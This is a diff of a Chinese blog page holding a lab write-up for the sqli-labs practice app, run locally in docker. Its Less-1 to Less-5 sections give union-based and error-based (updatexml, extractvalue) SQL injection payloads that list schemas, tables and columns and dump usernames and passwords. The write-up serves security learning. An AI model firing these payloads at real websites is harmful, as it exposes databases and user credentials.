@@ -1,130 +1,50 @@
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yglsaltfish.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
 
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="sql," />
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="Preparation： 为了不干扰本地搭建的环境，我的sql-lab是使用docker跑起来的。Win10 家庭版搭建起来比较繁琐，我使用的是 hyper-v + windows + docker for windows 跑的，命令比较简单，就只有两句话。 docker pull acgpiano&#x2F;sqli-labs  docker run -dt --name sqli-lab -p [你要映">
+  <meta name="description" content="sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sqli-lab 刷题记录">
 <meta property="og:url" content="https://yglsaltfish.github.io/2021/08/15/Sqli-lab-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="ATT_POWER的博客">
-<meta property="og:description" content="Preparation： 为了不干扰本地搭建的环境，我的sql-lab是使用docker跑起来的。Win10 家庭版搭建起来比较繁琐，我使用的是 hyper-v + windows + docker for windows 跑的，命令比较简单，就只有两句话。 docker pull acgpiano&#x2F;sqli-labs  docker run -dt --name sqli-lab -p [你要映">
+<meta property="og:description" content="sql注入">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-08-15T12:42:28.000Z">
-<meta property="article:modified_time" content="2022-01-01T14:17:02.488Z">
+<meta property="article:modified_time" content="2022-09-30T06:36:26.231Z">
 <meta property="article:author" content="ATT_POWER">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
 
+<link rel="canonical" href="https://yglsaltfish.github.io/2021/08/15/Sqli-lab-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
 
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
   };
 </script>
-
-
-
-  <link rel="canonical" href="https://yglsaltfish.github.io/2021/08/15/Sqli-lab-刷题记录/"/>
-
-
-
-
 
   <title>Sqli-lab 刷题记录 | ATT_POWER的博客</title>
   
@@ -134,253 +54,150 @@
 
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
-<meta name="generator" content="Hexo 6.0.0"></head>
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+</head>
 
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">ATT_POWER的博客</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
   </div>
 
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ATT_POWER的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
   </div>
 </div>
 
+
+
+
 <nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
+  <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            Home
-          </a>
-        </li>
-      
-        
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            Archives
-          </a>
-        </li>
-      
 
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
-            
-            Search
-          </a>
-        </li>
-      
-    </ul>
-  
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
-  
-    <div class="site-search">
-      
-  
-  <div class="algolia-popup popup search-popup">
-    <div class="algolia-search">
-      <div class="algolia-search-input-icon">
-        <i class="fa fa-search"></i>
-      </div>
-      <div class="algolia-search-input" id="algolia-search-input"></div>
-    </div>
-
-    <div class="algolia-results">
-      <div id="algolia-stats"></div>
-      <div id="algolia-hits"></div>
-      <div id="algolia-pagination" class="algolia-pagination"></div>
-    </div>
-
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-  </div>
-
-
-
-
-    </div>
-  
+  </li>
+  </ul>
 </nav>
 
 
 
- </div>
+
+</div>
     </header>
 
-    <main id="main" class="main">
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          <div id="content" class="content">
+          
+
+          <div class="content post posts-expand">
             
 
-  <div id="posts" class="posts-expand">
     
-
-  
-
   
   
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://yglsaltfish.github.io/2021/08/15/Sqli-lab-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ATT_POWER">
+      <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="ATT_POWER的博客">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">Sqli-lab 刷题记录</h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+          Sqli-lab 刷题记录
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-08-15T20:42:28+08:00">
-                2021-08-15
-              </time>
-            
+              <span class="post-meta-item-text">发表于</span>
 
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
+              <time title="创建时间：2021-08-15 20:42:28" itemprop="dateCreated datePublished" datetime="2021-08-15T20:42:28+08:00">2021-08-15</time>
             </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
+              <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  913
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-30 14:36:26" itemprop="dateModified" datetime="2022-09-30T14:36:26+08:00">2022-09-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  4
-                </span>
-              
-            </div>
-          
+            </span>
 
           
+            <div class="post-description">sql注入</div>
 
         </div>
       </header>
-    
 
     
     
@@ -388,18 +205,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
+        <h2 id="Preparation："><a href="#Preparation：" class="headerlink" title="Preparation："></a>Preparation：</h2><p>为了不干扰本地搭建的环境，我的sql-lab是使用docker跑起来的。Win10 家庭版搭建起来比较繁琐，我使用的是 hyper-v + windows + docker for windows 跑的，命令比较简单，就只有两句话。<br><pre class="language-docker" data-language="docker"><code class="language-docker">docker pull acgpiano/sqli-labs
 
-      
-        <h2 id="Preparation：">Preparation：</h2>
-<p>为了不干扰本地搭建的环境，我的sql-lab是使用docker跑起来的。Win10 家庭版搭建起来比较繁琐，我使用的是 hyper-v + windows + docker for windows 跑的，命令比较简单，就只有两句话。</p>
-<pre class="language-docker" data-language="docker"><code class="language-docker">docker pull acgpiano/sqli-labs
-
-docker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest</code></pre>
-<h2 id="Basic">Basic</h2>
-<ol>
-<li>列举一下sql的基础语句，学了好久了，感觉要忘光了orz。</li>
-</ol>
+docker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest</code></pre></p>
+<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><ol>
+<li><p>列举一下sql的基础语句，学了好久了，感觉要忘光了orz。</p>
 <pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span>         <span class="token comment">//查看数据库</span>
 
 <span class="token keyword">use</span> xxx<span class="token punctuation">;</span>                <span class="token comment">//使用某个数据库</span>
@@ -427,58 +237,32 @@ ascii<span class="token punctuation">(</span><span class="token punctuation">)</
 ord<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment">//将某个字符转换成ascii码，同ascii()</span>
 
 </code></pre>
-<ol start="2">
-<li>报错注入的原理<br>
-在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：updatexml()和extractvalue()<br>
-当这两个函数在执行时，如果出现xml文档路径错误就会产生报错<br>
-利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</li>
+</li>
+<li><p>报错注入的原理<br>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：updatexml()和extractvalue()<br>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错<br>利用select count(<em>),floor(rand(0)</em>2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</p>
+</li>
 </ol>
-<h2 id="Less-1">Less-1</h2>
-<ol>
-<li>查询代码:</li>
-</ol>
-<pre class="language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre>
-<ol start="2">
-<li>查询字段数量和回显点</li>
-</ol>
-<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>数字<span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">23</span>
-这里最后查询到的字段数为<span class="token number">3</span>，回显点为<span class="token number">2</span>、<span class="token number">3</span>个字段</code></pre>
-<ol start="3">
-<li>查询数据库的版本和当前数据库</li>
-</ol>
-<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
-结果：</code></pre>
-<ol start="4">
-<li>查询所有数据库的名字</li>
-</ol>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ol>
+<li>查询代码:<pre class="language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre></li>
+<li>查询字段数量和回显点<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>数字<span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">23</span>
+这里最后查询到的字段数为<span class="token number">3</span>，回显点为<span class="token number">2</span>、<span class="token number">3</span>个字段</code></pre></li>
+<li>查询数据库的版本和当前数据库<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
+结果：</code></pre></li>
+<li><p>查询所有数据库的名字</p>
 <pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
 结果:information_schema<span class="token punctuation">,</span>challenges<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>security</code></pre>
-<ol start="5">
-<li>查询指定数据库的表的名字</li>
-</ol>
+</li>
+<li><p>查询指定数据库的表的名字</p>
 <pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema='</span>security'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
-结果：emails<span class="token punctuation">,</span>referers<span class="token punctuation">,</span>uagents<span class="token punctuation">,</span>users</code></pre>
-<ol start="6">
-<li>查询指定数据库、表的列名</li>
+结果：emails<span class="token punctuation">,</span>referers<span class="token punctuation">,</span>uagents<span class="token punctuation">,</span>users</code></pre></li>
+<li>查询指定数据库、表的列名<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>users'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
+结果:id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password</code></pre></li>
+<li>查询用户名和密码<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,(select group_concat(username separator '</span><span class="token punctuation">;</span><span class="token string">')from users),(select group_concat(password separator '</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
+</li>
 </ol>
-<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>users'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
-结果:id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password</code></pre>
-<ol start="7">
-<li>查询用户名和密码</li>
-</ol>
-<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,(select group_concat(username separator '</span><span class="token punctuation">;</span><span class="token string">')from users),(select group_concat(password separator '</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
-<h2 id="Less-2">Less-2</h2>
-<p>该题和Less-1差不多解法，区别在于Less-1是字符型注入，该题是数字型注入，具体不详细赘述了。</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
-<h2 id="Less-3">Less-3</h2>
-<p>该题和Less-1差不多解法，改变一下闭合方式。</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
-<h2 id="Less-4">Less-4</h2>
-<p>该题和Less-1差不多解法，改变一下闭合方式。</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
-<h2 id="Less-5">Less-5</h2>
-<p>该题是使用报错注入的方法。</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql">数据库及相关信息:
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>该题和Less-1差不多解法，区别在于Less-1是字符型注入，该题是数字型注入，具体不详细赘述了。<br><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>该题和Less-1差不多解法，改变一下闭合方式。<br><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>该题和Less-1差不多解法，改变一下闭合方式。<br><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>该题是使用报错注入的方法。<br><pre class="language-sql" data-language="sql"><code class="language-sql">数据库及相关信息:
 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)%23
 
 ?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
@@ -496,263 +280,183 @@ ord<span class="token punctuation">(</span><span class="token punctuation">)</sp
 数据库指定表指定列的字段：
 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(password)from security.users),0x7e),1)%23
 
-?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
+?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p>
 
-      
     </div>
+
     
     
     
 
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/sql/" rel="tag"># sql</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2021/05/05/%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" rel="next" title="题目记录">
-                <i class="fa fa-chevron-left"></i> 题目记录
-              </a>
-            
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql/" rel="tag"># sql</a>
           </div>
 
-          <span class="post-nav-divider"></span>
+        
 
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/" rel="prev" title="BUUCTF WEB [RoarCTF 2019]Easy Calc">
-                BUUCTF WEB [RoarCTF 2019]Easy Calc <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
 
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/05/%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" rel="prev" title="题目记录">
+      <i class="fa fa-chevron-left"></i> 题目记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/" rel="next" title="BUUCTF WEB [RoarCTF 2019]Easy Calc">
+      BUUCTF WEB [RoarCTF 2019]Easy Calc <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
   </article>
+  
+  
+  
 
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
 
 
           </div>
           
 
-
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-      <div id="sidebar-dimmer"></div>
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name"></p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
